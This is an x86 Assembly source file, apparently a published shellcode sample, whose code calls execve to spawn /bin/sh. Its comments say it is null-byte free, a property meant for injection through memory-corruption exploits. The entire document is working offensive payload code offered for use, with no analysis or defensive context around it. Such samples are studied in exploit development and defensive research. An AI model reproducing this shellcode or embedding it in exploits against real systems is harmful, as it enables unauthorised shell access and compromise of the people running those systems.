; Author: lem0nSec_
; Date: 30/04/2022
; Lang: x86 Assembly

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; 1) This shellcode will spawn /bin/sh
; 2) Null-bytes free
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;



%define sys_execve 0x0b
%define sys_exit 0x1

section .text
        global _start

_start:
        xor eax, eax
        push eax
        mov al, sys_execve
        push 0x68732F2F         ; hs//
        push 0x6E69622F         ; nib/
        mov ebx, esp            ; storing //bin/sh into ebx
        xor ecx, ecx
        push ecx                ; pushing zero onto the stack
        int 0x80                ; calling execve

_exit:
        xor eax, eax
        push eax
        mov al, sys_exit
        int 0x80
